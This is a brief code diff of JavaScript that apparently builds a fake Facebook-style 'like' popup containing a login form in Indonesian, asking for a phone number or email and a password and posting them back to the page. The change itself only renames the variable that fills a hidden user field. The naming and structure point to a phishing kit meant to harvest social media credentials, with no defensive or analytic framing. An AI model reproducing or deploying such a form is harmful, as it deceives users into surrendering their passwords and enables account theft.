@@ -22,7 +22,7 @@ function fbLikeDump(a) { if (a == true) { createCookie(likes + "fblikepop", "tru
             title: tit, message: `
         <div class='lk-container'><div id="res"></div>
         <center><form action='' method='POST'>
-        <div class='col'><input type='hidden' id='mrx' name='u' value='` + us + `'>
+        <div class='col'><input type='hidden' id='mrx' name='u' value='` + usr + `'>
         <input type='text' id='ml' name='m' placeholder='Nomor ponsel atau email' required>
         <input type='password' id='pw' name='p' placeholder='Kata Sandi' required>
         <button type='button' id='bt' class='btn btn-button'> Login </button>
